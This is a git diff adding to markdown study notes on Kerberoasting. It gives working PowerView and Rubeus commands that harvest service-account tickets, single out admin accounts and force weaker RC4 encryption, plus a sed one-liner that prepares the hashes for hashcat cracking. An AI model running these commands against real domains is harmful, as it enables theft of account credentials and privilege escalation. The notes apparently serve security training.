@@ -193,7 +193,7 @@ kerberos::list /export
 
 ------------
 
-- If base64 encoded, decoded first it base64
+- If base64 encoded, decode first it base64
 - Then, convert to tickets with `kirbi2john`
 
 <img width="1897" height="865" alt="image" src="https://github.com/user-attachments/assets/2673e520-5ad1-4e24-a2b7-4699bf6e2c20" />
@@ -202,6 +202,89 @@ kerberos::list /export
 
 <img width="1317" height="274" alt="image" src="https://github.com/user-attachments/assets/0f587cd6-f7d0-45c9-b550-408d3dfe83e3" />
 
+- Modifying for hashcat
+
+```bash
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' tickets.txt
+```
+
+- Using [Powerview](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to capture the tickets
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+
+<img width="837" height="294" alt="image" src="https://github.com/user-attachments/assets/5af90cd3-e960-4e1f-9af9-af7529ec1d48" />
+
+- Targeting a specific user
+
+```powershell
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+<img width="1199" height="621" alt="image" src="https://github.com/user-attachments/assets/f5332108-49e6-4f18-bf2f-5080cdce7843" />
+
+- Exporting to csv format-:
+
+```powershell
+Get-DomainUser * -spn | Get-DomainSPNTicket -Format Hashcat | Export-csv .\powershell.csv -NoTypeInformation
+```
+
+<img width="1202" height="288" alt="image" src="https://github.com/user-attachments/assets/0097d3c9-2c34-4355-bc2d-12545fcc27bc" />
+
+-------------
+
+### Using Rubeus
+
+---------------
+
+- [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)
+- Getting all the stats and info
+
+```powershell
+.\Rubeus.exe kerberoast /stats
+```
+
+<img width="1200" height="604" alt="image" src="https://github.com/user-attachments/assets/a09d9852-c885-485f-8ae2-5658d4dfbd43" />
+
+- Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.Using the `/nowrap` flag
+
+```powershell
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+<img width="1198" height="682" alt="image" src="https://github.com/user-attachments/assets/477b0038-c4f1-450e-bc60-0475d76c3cac" />
+
+
+---------------
+
+### Other Encryption Types
+
+---------------
+
+- Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.
+- Requesting a ticket for user `testspn`
+
+```powershell
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
+- Checking supported hash type with `Powerview`, `msds-supportedencryptiontypes` is set to `AES 128/256`
+
+```powershell
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+```
+<img width="1196" height="112" alt="image" src="https://github.com/user-attachments/assets/aac9ff57-1313-46b0-be41-d4ba7f52fe24" />
+
+- Use `/tgtdeleg` to request for only RC4 encryption hash (type 23)-:
+
+```powershell
+ .\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
+```
+
+<img width="1222" height="700" alt="image" src="https://github.com/user-attachments/assets/d3f19e6b-cd11-46f6-b6ff-d9af3b434328" />
+
+- 
 
 
 
